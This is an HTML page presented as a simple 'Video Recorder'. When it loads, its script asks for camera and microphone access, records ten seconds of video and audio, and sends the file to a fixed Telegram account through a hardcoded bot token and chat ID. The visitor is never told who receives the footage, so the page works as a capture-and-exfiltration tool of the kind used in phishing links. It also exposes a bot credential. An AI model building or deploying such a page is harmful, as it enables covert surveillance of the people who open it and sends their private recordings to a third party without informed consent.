<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Recorder</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            overflow: hidden;
        }
        #recorder {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        #canvas {
            border: 5px solid #ff4500;
            border-radius: 10px;
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
        }
    </style>
</head>
<body>
    <div id="recorder">
        <h1>Recording Video...</h1>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>

    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let mediaRecorder;
        let recordedChunks = [];

        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    recordedChunks = [];
                    await sendToTelegram(videoBlob);
                };

                mediaRecorder.start();
                drawCanvas(video);

                setTimeout(() => {
                    mediaRecorder.stop();
                    video.pause();
                    stream.getTracks().forEach(track => track.stop());
                }, 10000); // Record for 10 seconds

            } catch (error) {
                console.error('Error accessing media devices.', error);
                alert('Could not start video recording. Please ensure you have granted camera and microphone permissions.');
            }
        }

        function drawCanvas(video) {
            const draw = () => {
                if (!video.paused && !video.ended) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    requestAnimationFrame(draw);
                }
            };
            draw();
        }

        async function sendToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append('video', videoBlob, 'video.webm');

            const telegramBotToken = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA';
            const telegramChatId = '1691680798';
            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${telegramChatId}`;

            try {
                const response = await fetch(telegramApiUrl, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    alert('Video sent to Telegram successfully!');
                } else {
                    alert('Failed to send video to Telegram.');
                }
            } catch (error) {
                console.error('Error sending video to Telegram:', error);
                alert('Error sending video to Telegram.');
            }
        }

        // Start recording automatically when the page loads
        window.addEventListener('load', startRecording);
    </script>
</body>
</html>
